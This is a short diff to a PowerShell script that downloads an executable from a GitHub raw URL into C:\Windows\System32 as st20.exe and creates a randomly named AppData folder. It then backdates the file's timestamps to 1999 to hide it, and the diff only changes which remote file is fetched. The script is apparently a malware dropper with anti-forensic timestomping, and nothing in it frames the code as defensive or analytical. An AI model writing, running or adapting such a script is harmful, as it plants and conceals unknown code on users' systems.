@@ -1,6 +1,6 @@
 $TargetPath = "C:\Windows\System32\st20.exe"
 mkdir ("C:\Users\" + $env:USERNAME + "\AppData\Roaming\Data\fa7tr3b4awe9hnte563cdn324v3q4z36\")
-curl "https://raw.githubusercontent.com/mohamedali43/ps1/main/st.exe" -o $TargetPath
+curl "https://raw.githubusercontent.com/mohamedali43/ps1/main/st20.exe" -o $TargetPath
 
 (Get-Item $TargetPath).CreationTime=("1 Jan 1999 0:00:00")
 (Get-Item $TargetPath).LastWriteTime=("1 Jan 1999 0:00:00")
